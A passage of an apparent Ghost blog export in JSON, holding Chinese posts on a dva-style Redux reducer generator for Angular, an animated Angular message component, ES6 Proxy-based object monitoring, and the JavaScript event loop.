false, writable: false, configurable: false })\n    Object.defineProperty(model, 'effects', { enumerable: false, writable: false, configurable: false })\n\n    // for(var x in model){\n    //     debugger;\n    // }\n    function res(state = model.state, action) {\n\n        for (var key in model.effects) {\n            if (action.type == key) {\n                co(model.effects[key].bind(state, action, store)).then((val) =&gt; {\n                    if (action.callback != null) {\n                        action.callback(val)\n                    }\n                    if (process.env.node_ENV != 'production') {\n                        if (log) {\n                            console.group(&quot;dispatch log&quot;);\n                            console.log(&quot;action type:&quot;,action.type);\n                            console.log(&quot;action payload:&quot;,action.payload);\n                            console.log(&quot;current state:&quot;,state);\n                            console.log(&quot;global store:&quot;,store);\n                            console.groupEnd();\n                        }\n                    }\n                }, (e) =&gt; { console.error(e.stack); })\n\n                return state\n            }\n        }\n        return state;\n    }\n    return res\n}\n\nfunction dva(models, log = false) {\n\n    let store = {};\n    let root = {}\n    models.forEach((x) =&gt; {\n\n        root[x.namespace] = x.state;\n        store[x.namespace] = run(x, root, log);\n    });\n    return store;\n}\nexport default dva;\n</code></pre>\n<p>使用：</p>\n<pre><code>const data = {\n    namespace: 'data',\n\n    state: {\n        cout:0\n    },\n\n    effects: {\n        *INCREMENT({payload}) {\n            var data=yield new Promise(function(resolve, reject) {\n                    setTimeout(()=&gt;{\n                        resolve(2)\n                    },1000)\n                });\n            \n            this.cout += data;\n        },\n        *DECREMENT({payload},store) {\n            this.cout -= 1;\n         //   console.log(store);\n         //   setTimeout(()=&gt;{store.data.state+=1;},1000)\n         //   store.data.state-=1;\n        },\n        *RESET({payload}) {\n            this.cout = 0;\n        }\n    }\n}\n\nStoreModule.provideStore(dva([data],true)),\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"109","plaintext":"最近在ng4上面用redux，感觉redux原生的Reducer写法还是太麻烦了。写了一个function生成。还加入co用于 Generator\n函数的自动执行和全局store修改。还有日志功能，输出action.type，action.payload,当前Reducer的参数即model的状态，全局的store（用于修改其它Reducer/model中的状态）。\n\n\nimport co from 'co';\nimport * as warning from 'warning';\n\nconst SEP = '/'\nfunction run(model: any, store, log) {\n    const { namespace, effects } = model;\n    warning(namespace != null, `namespace is a must`);\n    warning(effects != null, `effects is a must`);\n    function applyNamespace(type) {\n        function getNamespacedReducers(reducers) {\n            return Object.keys(reducers).reduce((memo, key) => {\n                warning(\n                    key.indexOf(`${namespace}${SEP}`) !== 0,\n                    `app.model: ${type.slice(0, -1)} ${key} should not be prefixed with namespace ${namespace}`,\n                );\n                memo[`${namespace}${SEP}${key}`] = reducers[key];\n                return memo;\n            }, {});\n        }\n\n        if (model[type]) {\n            if (type === 'effects') {\n\n                model[type] = getNamespacedReducers(model[type]);\n\n            }\n        }\n    }\n\n    applyNamespace('effects');\n    Object.defineProperty(model, 'namespace', { enumerable: false, writable: false, configurable: false })\n    Object.defineProperty(model, 'effects', { enumerable: false, writable: false, configurable: false })\n\n    // for(var x in model){\n    //     debugger;\n    // }\n    function res(state = model.state, action) {\n\n        for (var key in model.effects) {\n            if (action.type == key) {\n                co(model.effects[key].bind(state, action, store)).then((val) => {\n                    if (action.callback != null) {\n                        action.callback(val)\n                    }\n                    if (process.env.node_ENV != 'production') {\n                        if (log) {\n                            console.group(\"dispatch log\");\n                            console.log(\"action type:\",action.type);\n                            console.log(\"action payload:\",action.payload);\n                            console.log(\"current state:\",state);\n                            console.log(\"global store:\",store);\n                            console.groupEnd();\n                        }\n                    }\n                }, (e) => { console.error(e.stack); })\n\n                return state\n            }\n        }\n        return state;\n    }\n    return res\n}\n\nfunction dva(models, log = false) {\n\n    let store = {};\n    let root = {}\n    models.forEach((x) => {\n\n        root[x.namespace] = x.state;\n        store[x.namespace] = run(x, root, log);\n    });\n    return store;\n}\nexport default dva;\n\n\n使用：\n\nconst data = {\n    namespace: 'data',\n\n    state: {\n        cout:0\n    },\n\n    effects: {\n        *INCREMENT({payload}) {\n            var data=yield new Promise(function(resolve, reject) {\n                    setTimeout(()=>{\n                        resolve(2)\n                    },1000)\n                });\n            \n            this.cout += data;\n        },\n        *DECREMENT({payload},store) {\n            this.cout -= 1;\n         //   console.log(store);\n         //   setTimeout(()=>{store.data.state+=1;},1000)\n         //   store.data.state-=1;\n        },\n        *RESET({payload}) {\n            this.cout = 0;\n        }\n    }\n}\n\nStoreModule.provideStore(dva([data],true)),","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-05-15T10:57:40.000Z","created_by":"1","updated_at":"2017-05-15T11:12:41.000Z","updated_by":"1","published_at":"2017-05-15T11:02:09.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d32a","uuid":"89aa745c-9049-476a-9bad-4de420e73fa6","title":"@angular/animations学习","slug":"angular-animationsxue-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"ng这个animations还是蛮好用的。加入场，离场各种效果，还是满酷炫的。写了一个提示组件。是一个队列，依次显示。然后按照定义的时间消失，在提示进场和离场时还有动画。如图：\\n![](/content/images/2017/05/QQ--20170516195646.png)\\n\\n> ng4代码\\n```\\nimport { Component, Input, OnInit, } from '@angular/core';\\nimport {\\n  trigger,\\n  state,\\n  style,\\n  animate,\\n  transition,keyframes\\n} from '@angular/animations';\\nimport * as Rx from 'rxjs';\\nimport { Observable, Subject } from 'rxjs';\\n\\n\\nlet list:any = []\\n\\nvar subject = new Rx.BehaviorSubject(list);\\n\\nlet id = 0;\\n\\nfunction log(type:string, content:string, duration = 1500, onClose?:any) {\\n    id++;\\n    let obj = {\\n        type: type,\\n        content,\\n        id,\\n        onClose,\\n        state:'in'\\n    }\\n    list = [...list, obj]\\n\\n    function close() {\\n        list = list.filter((x:any) => {\\n            if (x.id == obj.id) {\\n                if (obj.onClose != null) { obj.onClose(); }\\n              \\n                return false;\\n            } else { return true; }\\n        })\\n        subject.next(list)\\n    }\\n    setTimeout(close, duration)\\n    subject.next(list)\\n    return close;\\n}\\n\\n@Component({\\n    selector: 'acMessage',\\n    template: `<div data-reactroot=\\\"\\\" class=\\\"ant-message\\\">\\n        <span >\\n             <ng-container *ngFor=\\\"let item of list|async\\\">\\n                <div [@flyInOut]=\\\"'in'\\\" class=\\\"ant-message-notice\\\">\\n                    <div    class=\\\"ant-message-notice-content\\\">\\n                        <div class=\\\"ant-message-custom-content ant-message-{{item.type}}\\\" [ngSwitch]=\\\"item.type\\\">\\n                            <i *ngSwitchCase=\\\"'success'\\\" class=\\\"anticon anticon-check-circle\\\"></i>\\n                            <i *ngSwitchCase=\\\"'error'\\\" class=\\\"anticon anticon-cross-circle\\\"></i>\\n                            <i *ngSwitchCase=\\\"'info'\\\" class=\\\"anticon anticon-info-circle\\\"></i>\\n                            <i *ngSwitchCase=\\\"'warning'\\\" class=\\\"anticon anticon-exclamation-circle\\\"></i>\\n                            <i *ngSwitchCase=\\\"'loading'\\\" class=\\\"anticon anticon-spin anticon-loading\\\"></i>\\n   \\n                            <span>{{item.content}}</span>\\n                        </div>\\n                    </div>\\n                </div>\\n             </ng-container>\\n        </span>\\n    </div>`,\\n    animations: [\\n        trigger('flyInOut', [\\n            state('in', style({ opacity: 1, transform: 'translateX(0)' })),\\n    //        state('done', style({  opacity: 0.5 ,transform: 'translateX(100%)', })),\\n            transition('void => in', [\\n                style({\\n                    opacity: 0,\\n                    transform: 'translateX(-100px)'\\n                }),\\n                animate('0.2s ease-in')\\n            ]),\\n            transition('* => void', [\\n                animate('0.2s  ease-out', style({\\n                    opacity: 0.5,\\n                    transform: 'translateX(100px)',\\n                }))\\n            ]),\\n\\n        ])\\n    ]\\n})\\nexport default class message {\\n\\n    list: Observable<any>;\\n\\n\\n\\n    state: Observable<any>;\\n    constructor() {\\n  \\n        this.list = subject.asObservable();\\n    }\\n\\n    static success(content:any, duration = 1500, onClose?:any) {\\n        log('success', content, duration, onClose)\\n    }\\n    static error(content:any, duration = 1500, onClose?:any) {\\n        return log('error', content, duration, onClose)\\n    }\\n    static info(content:any, duration = 1500, onClose?:any) {\\n        return log('info', content, duration, onClose)\\n    }\\n    static warning(content:any, duration = 1500, onClose?:any) {\\n        return log('warning', content, duration, onClose)\\n    }\\n    static warn(content:any, duration = 1500, onClose?:any) {\\n        return log('warning', content, duration, onClose)\\n    }\\n    static loading(content:any, duration = 1500, onClose?:any) {\\n        return log('loading', content, duration, onClose)\\n    }\\n}\\n```\\n> ng2动画是从'@angular/core'引入。\\n\\n`import { Component, Input, OnInit, trigger, state, animate, transition, style  } from '@angular/core';`\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>ng这个animations还是蛮好用的。加入场，离场各种效果，还是满酷炫的。写了一个提示组件。是一个队列，依次显示。然后按照定义的时间消失，在提示进场和离场时还有动画。如图：<br>\n<img src=\"/content/images/2017/05/QQ--20170516195646.png\" alt=\"\"></p>\n<blockquote>\n<p>ng4代码</p>\n</blockquote>\n<pre><code>import { Component, Input, OnInit, } from '@angular/core';\nimport {\n  trigger,\n  state,\n  style,\n  animate,\n  transition,keyframes\n} from '@angular/animations';\nimport * as Rx from 'rxjs';\nimport { Observable, Subject } from 'rxjs';\n\n\nlet list:any = []\n\nvar subject = new Rx.BehaviorSubject(list);\n\nlet id = 0;\n\nfunction log(type:string, content:string, duration = 1500, onClose?:any) {\n    id++;\n    let obj = {\n        type: type,\n        content,\n        id,\n        onClose,\n        state:'in'\n    }\n    list = [...list, obj]\n\n    function close() {\n        list = list.filter((x:any) =&gt; {\n            if (x.id == obj.id) {\n                if (obj.onClose != null) { obj.onClose(); }\n              \n                return false;\n            } else { return true; }\n        })\n        subject.next(list)\n    }\n    setTimeout(close, duration)\n    subject.next(list)\n    return close;\n}\n\n@Component({\n    selector: 'acMessage',\n    template: `&lt;div data-reactroot=&quot;&quot; class=&quot;ant-message&quot;&gt;\n        &lt;span &gt;\n             &lt;ng-container *ngFor=&quot;let item of list|async&quot;&gt;\n                &lt;div [@flyInOut]=&quot;'in'&quot; class=&quot;ant-message-notice&quot;&gt;\n                    &lt;div    class=&quot;ant-message-notice-content&quot;&gt;\n                        &lt;div class=&quot;ant-message-custom-content ant-message-{{item.type}}&quot; [ngSwitch]=&quot;item.type&quot;&gt;\n                            &lt;i *ngSwitchCase=&quot;'success'&quot; class=&quot;anticon anticon-check-circle&quot;&gt;&lt;/i&gt;\n                            &lt;i *ngSwitchCase=&quot;'error'&quot; class=&quot;anticon anticon-cross-circle&quot;&gt;&lt;/i&gt;\n                            &lt;i *ngSwitchCase=&quot;'info'&quot; class=&quot;anticon anticon-info-circle&quot;&gt;&lt;/i&gt;\n                            &lt;i *ngSwitchCase=&quot;'warning'&quot; class=&quot;anticon anticon-exclamation-circle&quot;&gt;&lt;/i&gt;\n                            &lt;i *ngSwitchCase=&quot;'loading'&quot; class=&quot;anticon anticon-spin anticon-loading&quot;&gt;&lt;/i&gt;\n   \n                            &lt;span&gt;{{item.content}}&lt;/span&gt;\n                        &lt;/div&gt;\n                    &lt;/div&gt;\n                &lt;/div&gt;\n             &lt;/ng-container&gt;\n        &lt;/span&gt;\n    &lt;/div&gt;`,\n    animations: [\n        trigger('flyInOut', [\n            state('in', style({ opacity: 1, transform: 'translateX(0)' })),\n    //        state('done', style({  opacity: 0.5 ,transform: 'translateX(100%)', })),\n            transition('void =&gt; in', [\n                style({\n                    opacity: 0,\n                    transform: 'translateX(-100px)'\n                }),\n                animate('0.2s ease-in')\n            ]),\n            transition('* =&gt; void', [\n                animate('0.2s  ease-out', style({\n                    opacity: 0.5,\n                    transform: 'translateX(100px)',\n                }))\n            ]),\n\n        ])\n    ]\n})\nexport default class message {\n\n    list: Observable&lt;any&gt;;\n\n\n\n    state: Observable&lt;any&gt;;\n    constructor() {\n  \n        this.list = subject.asObservable();\n    }\n\n    static success(content:any, duration = 1500, onClose?:any) {\n        log('success', content, duration, onClose)\n    }\n    static error(content:any, duration = 1500, onClose?:any) {\n        return log('error', content, duration, onClose)\n    }\n    static info(content:any, duration = 1500, onClose?:any) {\n        return log('info', content, duration, onClose)\n    }\n    static warning(content:any, duration = 1500, onClose?:any) {\n        return log('warning', content, duration, onClose)\n    }\n    static warn(content:any, duration = 1500, onClose?:any) {\n        return log('warning', content, duration, onClose)\n    }\n    static loading(content:any, duration = 1500, onClose?:any) {\n        return log('loading', content, duration, onClose)\n    }\n}\n</code></pre>\n<blockquote>\n<p>ng2动画是从'@angular/core'引入。</p>\n</blockquote>\n<p><code>import { Component, Input, OnInit, trigger, state, animate, transition, style  } from '@angular/core';</code></p>\n<!--kg-card-end: markdown-->","comment_id":"110","plaintext":"ng这个animations还是蛮好用的。加入场，离场各种效果，还是满酷炫的。写了一个提示组件。是一个队列，依次显示。然后按照定义的时间消失，在提示进场和离场时还有动画。如图：\n\n\n> ng4代码\n\n\nimport { Component, Input, OnInit, } from '@angular/core';\nimport {\n  trigger,\n  state,\n  style,\n  animate,\n  transition,keyframes\n} from '@angular/animations';\nimport * as Rx from 'rxjs';\nimport { Observable, Subject } from 'rxjs';\n\n\nlet list:any = []\n\nvar subject = new Rx.BehaviorSubject(list);\n\nlet id = 0;\n\nfunction log(type:string, content:string, duration = 1500, onClose?:any) {\n    id++;\n    let obj = {\n        type: type,\n        content,\n        id,\n        onClose,\n        state:'in'\n    }\n    list = [...list, obj]\n\n    function close() {\n        list = list.filter((x:any) => {\n            if (x.id == obj.id) {\n                if (obj.onClose != null) { obj.onClose(); }\n              \n                return false;\n            } else { return true; }\n        })\n        subject.next(list)\n    }\n    setTimeout(close, duration)\n    subject.next(list)\n    return close;\n}\n\n@Component({\n    selector: 'acMessage',\n    template: `<div data-reactroot=\"\" class=\"ant-message\">\n        <span >\n             <ng-container *ngFor=\"let item of list|async\">\n                <div [@flyInOut]=\"'in'\" class=\"ant-message-notice\">\n                    <div    class=\"ant-message-notice-content\">\n                        <div class=\"ant-message-custom-content ant-message-{{item.type}}\" [ngSwitch]=\"item.type\">\n                            <i *ngSwitchCase=\"'success'\" class=\"anticon anticon-check-circle\"></i>\n                            <i *ngSwitchCase=\"'error'\" class=\"anticon anticon-cross-circle\"></i>\n                            <i *ngSwitchCase=\"'info'\" class=\"anticon anticon-info-circle\"></i>\n                            <i *ngSwitchCase=\"'warning'\" class=\"anticon anticon-exclamation-circle\"></i>\n                            <i *ngSwitchCase=\"'loading'\" class=\"anticon anticon-spin anticon-loading\"></i>\n   \n                            <span>{{item.content}}</span>\n                        </div>\n                    </div>\n                </div>\n             </ng-container>\n        </span>\n    </div>`,\n    animations: [\n        trigger('flyInOut', [\n            state('in', style({ opacity: 1, transform: 'translateX(0)' })),\n    //        state('done', style({  opacity: 0.5 ,transform: 'translateX(100%)', })),\n            transition('void => in', [\n                style({\n                    opacity: 0,\n                    transform: 'translateX(-100px)'\n                }),\n                animate('0.2s ease-in')\n            ]),\n            transition('* => void', [\n                animate('0.2s  ease-out', style({\n                    opacity: 0.5,\n                    transform: 'translateX(100px)',\n                }))\n            ]),\n\n        ])\n    ]\n})\nexport default class message {\n\n    list: Observable<any>;\n\n\n\n    state: Observable<any>;\n    constructor() {\n  \n        this.list = subject.asObservable();\n    }\n\n    static success(content:any, duration = 1500, onClose?:any) {\n        log('success', content, duration, onClose)\n    }\n    static error(content:any, duration = 1500, onClose?:any) {\n        return log('error', content, duration, onClose)\n    }\n    static info(content:any, duration = 1500, onClose?:any) {\n        return log('info', content, duration, onClose)\n    }\n    static warning(content:any, duration = 1500, onClose?:any) {\n        return log('warning', content, duration, onClose)\n    }\n    static warn(content:any, duration = 1500, onClose?:any) {\n        return log('warning', content, duration, onClose)\n    }\n    static loading(content:any, duration = 1500, onClose?:any) {\n        return log('loading', content, duration, onClose)\n    }\n}\n\n\n> ng2动画是从'@angular/core'引入。\n\n\nimport { Component, Input, OnInit, trigger, state, animate, transition, style }\nfrom '@angular/core';","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-05-16T11:54:06.000Z","created_by":"1","updated_at":"2017-05-16T12:00:57.000Z","updated_by":"1","published_at":"2017-05-16T12:00:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d32b","uuid":"69c53177-1386-4cba-8e83-05056b1d428d","title":"ES6代理实现对象监控","slug":"es6dai-li-shi-xian-dui-xiang-jian-kong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"以前写过一个es6代理的博客，但是只简单讲了。可以当对象监控使用。但是在下面这样的情况，就无效了\\n比如一个对象obj={name:{first:'小',last:'明'}},把obj设置set代理，假如我这样obj.name.last='红'，并不会触发set。这样不是我们要结果，当我们改变obj时，我可以知道对象改变了。下面利用闭包保存变量实现。\\n\\n> 实现\\n```\\n        function runProxy(state,key='this') {\\n            if (typeof state != 'object'||state==null) {\\n                return state\\n            }\\n            let prototype={}\\n            for (let x in state) {\\n                    prototype[x]=runProxy(state[x],key+'.'+x);\\n            }\\n            return new Proxy(state, {\\n                set(target, property, value, receiver) {\\n                    let  oldValue=target[property]\\n                    let  newValue=value\\n                    console.log(\\\"change property:%s --- %coldValue:%o ---%c> newValue:%o\\\",key+'.'+property.toString(),\\\"color:red\\\",oldValue,\\\"color:green\\\",newValue)\\n                    prototype[property]=runProxy(value,key+'.'+property.toString());\\n                    return Reflect.set(target, property, value);\\n                },\\n                get(target, property){\\n                    return Reflect.get(prototype, property);\\n                }\\n            })\\n        }\\n```\\n运行如下代码, 如图。在ngDva中把state监控。触发一个action，改变了state中什么属性，全部打印到控制台了。\\n```\\n        obj={name:{first:'小',last:'明'}}\\n        let Pobj=runProxy(obj)\\n        Pobj.name.first='刘'\\n        Pobj.name.last='红'\\n        Pobj.name.first={};\\n        Pobj.name.first.hhh='大地瓜'\\n        Pobj.name.first=[];\\n        Pobj.name.first[1]='大地瓜'\\n```\\n![](/content/images/2017/05/QQ--20170523193406.png)\\n\\n最近发现上面的方法还是有bug，如下代码，obj.name最后变成了代理对象。\\n```\\n        obj={name:{first:'小',last:'明'}}\\n        let Pobj=runProxy(obj)\\n        Pobj.name.first='刘'\\n        Pobj.name.last='红'\\n        Pobj.name.first={};\\n        Pobj.name=Pobj.name.first\\n```\\n\\n最终版:\\n```\\n        function runProxy(state, key = 'this', callback=()=>{}) {\\n            if (typeof state != 'object' || state == null || Array.isArray(state)) {\\n                return state\\n            }\\n            let prototype = {}\\n            prototype['getgetgetgetgetgetgetgetgetgetgetget'] = function () {\\n                return state;\\n            }\\n            for (let x in state) {\\n\\n                prototype[x] = runProxy(state[x], key + '.' + x, callback);\\n\\n            }\\n            let p = new Proxy(state, {\\n                set(target, property, value, receiver) {\\n\\n                    let oldValue = target[property]\\n\\n\\n                    let newValue = value;\\n\\n                    try {\\n                        if (typeof newValue['getgetgetgetgetgetgetgetgetgetgetget'] == \\\"function\\\") {\\n                            newValue = newValue['getgetgetgetgetgetgetgetgetgetgetget']();\\n                        }\\n\\n                    } catch (e) {\\n                        console.log(e)\\n                    }\\n\\n                    callback(key + '.' + property.toString(), oldValue, newValue)\\n                    // console.log(\\\"change property:%s --- %coldValue:%o ---%c> newValue:%o\\\", key + '.' + property.toString(), \\\"color:red\\\", oldValue, \\\"color:green\\\", newValue)\\n\\n                    prototype[property] = runProxy(value, key + '.' + property.toString(), callback);\\n\\n                    return Reflect.set(target, property, newValue);\\n                },\\n                get(target, property) {\\n                    return Reflect.get(prototype, property);\\n                }\\n            })\\n\\n            return p;\\n        }\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>以前写过一个es6代理的博客，但是只简单讲了。可以当对象监控使用。但是在下面这样的情况，就无效了<br>\n比如一个对象obj={name:{first:'小',last:'明'}},把obj设置set代理，假如我这样obj.name.last='红'，并不会触发set。这样不是我们要结果，当我们改变obj时，我可以知道对象改变了。下面利用闭包保存变量实现。</p>\n<blockquote>\n<p>实现</p>\n</blockquote>\n<pre><code>        function runProxy(state,key='this') {\n            if (typeof state != 'object'||state==null) {\n                return state\n            }\n            let prototype={}\n            for (let x in state) {\n                    prototype[x]=runProxy(state[x],key+'.'+x);\n            }\n            return new Proxy(state, {\n                set(target, property, value, receiver) {\n                    let  oldValue=target[property]\n                    let  newValue=value\n                    console.log(&quot;change property:%s --- %coldValue:%o ---%c&gt; newValue:%o&quot;,key+'.'+property.toString(),&quot;color:red&quot;,oldValue,&quot;color:green&quot;,newValue)\n                    prototype[property]=runProxy(value,key+'.'+property.toString());\n                    return Reflect.set(target, property, value);\n                },\n                get(target, property){\n                    return Reflect.get(prototype, property);\n                }\n            })\n        }\n</code></pre>\n<p>运行如下代码, 如图。在ngDva中把state监控。触发一个action，改变了state中什么属性，全部打印到控制台了。</p>\n<pre><code>        obj={name:{first:'小',last:'明'}}\n        let Pobj=runProxy(obj)\n        Pobj.name.first='刘'\n        Pobj.name.last='红'\n        Pobj.name.first={};\n        Pobj.name.first.hhh='大地瓜'\n        Pobj.name.first=[];\n        Pobj.name.first[1]='大地瓜'\n</code></pre>\n<p><img src=\"/content/images/2017/05/QQ--20170523193406.png\" alt=\"\"></p>\n<p>最近发现上面的方法还是有bug，如下代码，obj.name最后变成了代理对象。</p>\n<pre><code>        obj={name:{first:'小',last:'明'}}\n        let Pobj=runProxy(obj)\n        Pobj.name.first='刘'\n        Pobj.name.last='红'\n        Pobj.name.first={};\n        Pobj.name=Pobj.name.first\n</code></pre>\n<p>最终版:</p>\n<pre><code>        function runProxy(state, key = 'this', callback=()=&gt;{}) {\n            if (typeof state != 'object' || state == null || Array.isArray(state)) {\n                return state\n            }\n            let prototype = {}\n            prototype['getgetgetgetgetgetgetgetgetgetgetget'] = function () {\n                return state;\n            }\n            for (let x in state) {\n\n                prototype[x] = runProxy(state[x], key + '.' + x, callback);\n\n            }\n            let p = new Proxy(state, {\n                set(target, property, value, receiver) {\n\n                    let oldValue = target[property]\n\n\n                    let newValue = value;\n\n                    try {\n                        if (typeof newValue['getgetgetgetgetgetgetgetgetgetgetget'] == &quot;function&quot;) {\n                            newValue = newValue['getgetgetgetgetgetgetgetgetgetgetget']();\n                        }\n\n                    } catch (e) {\n                        console.log(e)\n                    }\n\n                    callback(key + '.' + property.toString(), oldValue, newValue)\n                    // console.log(&quot;change property:%s --- %coldValue:%o ---%c&gt; newValue:%o&quot;, key + '.' + property.toString(), &quot;color:red&quot;, oldValue, &quot;color:green&quot;, newValue)\n\n                    prototype[property] = runProxy(value, key + '.' + property.toString(), callback);\n\n                    return Reflect.set(target, property, newValue);\n                },\n                get(target, property) {\n                    return Reflect.get(prototype, property);\n                }\n            })\n\n            return p;\n        }\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"111","plaintext":"以前写过一个es6代理的博客，但是只简单讲了。可以当对象监控使用。但是在下面这样的情况，就无效了\n比如一个对象obj={name:{first:'小',last:'明'}},把obj设置set代理，假如我这样obj.name.last='红'，并不会触发set。这样不是我们要结果，当我们改变obj时，我可以知道对象改变了。下面利用闭包保存变量实现。\n\n> 实现\n\n\n        function runProxy(state,key='this') {\n            if (typeof state != 'object'||state==null) {\n                return state\n            }\n            let prototype={}\n            for (let x in state) {\n                    prototype[x]=runProxy(state[x],key+'.'+x);\n            }\n            return new Proxy(state, {\n                set(target, property, value, receiver) {\n                    let  oldValue=target[property]\n                    let  newValue=value\n                    console.log(\"change property:%s --- %coldValue:%o ---%c> newValue:%o\",key+'.'+property.toString(),\"color:red\",oldValue,\"color:green\",newValue)\n                    prototype[property]=runProxy(value,key+'.'+property.toString());\n                    return Reflect.set(target, property, value);\n                },\n                get(target, property){\n                    return Reflect.get(prototype, property);\n                }\n            })\n        }\n\n\n运行如下代码, 如图。在ngDva中把state监控。触发一个action，改变了state中什么属性，全部打印到控制台了。\n\n        obj={name:{first:'小',last:'明'}}\n        let Pobj=runProxy(obj)\n        Pobj.name.first='刘'\n        Pobj.name.last='红'\n        Pobj.name.first={};\n        Pobj.name.first.hhh='大地瓜'\n        Pobj.name.first=[];\n        Pobj.name.first[1]='大地瓜'\n\n\n\n\n最近发现上面的方法还是有bug，如下代码，obj.name最后变成了代理对象。\n\n        obj={name:{first:'小',last:'明'}}\n        let Pobj=runProxy(obj)\n        Pobj.name.first='刘'\n        Pobj.name.last='红'\n        Pobj.name.first={};\n        Pobj.name=Pobj.name.first\n\n\n最终版:\n\n        function runProxy(state, key = 'this', callback=()=>{}) {\n            if (typeof state != 'object' || state == null || Array.isArray(state)) {\n                return state\n            }\n            let prototype = {}\n            prototype['getgetgetgetgetgetgetgetgetgetgetget'] = function () {\n                return state;\n            }\n            for (let x in state) {\n\n                prototype[x] = runProxy(state[x], key + '.' + x, callback);\n\n            }\n            let p = new Proxy(state, {\n                set(target, property, value, receiver) {\n\n                    let oldValue = target[property]\n\n\n                    let newValue = value;\n\n                    try {\n                        if (typeof newValue['getgetgetgetgetgetgetgetgetgetgetget'] == \"function\") {\n                            newValue = newValue['getgetgetgetgetgetgetgetgetgetgetget']();\n                        }\n\n                    } catch (e) {\n                        console.log(e)\n                    }\n\n                    callback(key + '.' + property.toString(), oldValue, newValue)\n                    // console.log(\"change property:%s --- %coldValue:%o ---%c> newValue:%o\", key + '.' + property.toString(), \"color:red\", oldValue, \"color:green\", newValue)\n\n                    prototype[property] = runProxy(value, key + '.' + property.toString(), callback);\n\n                    return Reflect.set(target, property, newValue);\n                },\n                get(target, property) {\n                    return Reflect.get(prototype, property);\n                }\n            })\n\n            return p;\n        }","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-05-23T11:20:41.000Z","created_by":"1","updated_at":"2017-05-25T11:19:35.000Z","updated_by":"1","published_at":"2017-05-25T11:19:35.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d32c","uuid":"22233f18-89fb-4228-9f21-4db0d8589bf0","title":"js---Event Loop","slug":"js-event-loop","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"js是一门单线程语言。但不是简单的单线程，它还有异步任务机制。js引擎同步代码全部在 \\\"执行栈\\\" 跑，除了这个还有一个\\\"任务队列\\\"（task queue）。一旦\\\"执行栈\\\"中的所有同步任务执行完毕，系统就会读取\\\"任务队列\\\"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入下一个执行栈，开始执行。整个过程是无限循环的，这就是Event Loop（事件循环）。\\n\\n> 定时器\\n\\n在浏览器中，除了dom和网络异步任务外，剩下的就是定时器了。setTimeout()和setInterval()，HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。老版本的浏览器都将最短间隔设为10毫秒。因此，setTimeout(()=>{},0)，根本不是0秒。\\n\\n> Node.js的Event Loop\\n\\nnode除了setTimeout和setInterval这两个方法,还有process.nextTick和setImmediate。\\nprocess.nextTick方法可以push到当前\\\"执行栈\\\"的尾部。setImmediate方法则是在当前\\\"任务队列\\\"的尾部添加事件，是在下一次Event Loop时执行。\\n```\\nprocess.nextTick(function A() {\\n  console.log(1);\\n  process.nextTick(function B(){console.log(2);});\\n});\\n\\nsetTimeout(function timeout() {\\n  console.log('Next Event Loop');\\n}, 0)\\n// 1\\n// 2\\n// TIMEOUT FIRED\\n```\\nsetTimeout和setImmediate这两个一样，都是在下一次Event Loop时执行。他们的先后顺序是不确定的。\\n\\n在使用递归的时候，应该谨慎使用process.nextTick。因为process.nextTick总是在执行，主线程不会去读取\\\"事件队列\\\"！\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>js是一门单线程语言。但不是简单的单线程，它还有异步任务机制。js引擎同步代码全部在 &quot;执行栈&quot; 跑，除了这个还有一个&quot;任务队列&quot;（task queue）。一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入下一个执行栈，开始执行。整个过程是无限循环的，这就是Event Loop（事件循环）。</p>\n<blockquote>\n<p>定时器</p>\n</blockquote>\n<p>在浏览器中，除了dom和网络异步任务外，剩下的就是定时器了。setTimeout()和setInterval()，HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。老版本的浏览器都将最短间隔设为10毫秒。因此，setTimeout(()=&gt;{},0)，根本不是0秒。</p>\n<blockquote>\n<p>Node.js的Event Loop</p>\n</blockquote>\n<p>node除了setTimeout和setInterval这两个方法,还有process.nextTick和setImmediate。<br>\nprocess.nextTick方法可以push到当前&quot;执行栈&quot;的尾部。setImmediate方法则是在当前&quot;任务队列&quot;的尾部添加事件，是在下一次Event Loop时执行。</p>\n<pre><code>process.nextTick(function A() {\n  console.log(1);\n  process.nextTick(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n  console.log('Next Event Loop');\n}, 0)\n// 1\n// 2\n// TIMEOUT FIRED\n</code></pre>\n<p>setTimeout和setImmediate这两个一样，都是在下一次Event Loop时执行。他们的先后顺序是不确定的。</p>\n<p>在使用递归的时候，应该谨慎使用process.nextTick。因为process.nextTick总是在执行，主线程不会去读取&quot;事件队列&quot;！</p>\n<!--kg-card-end: 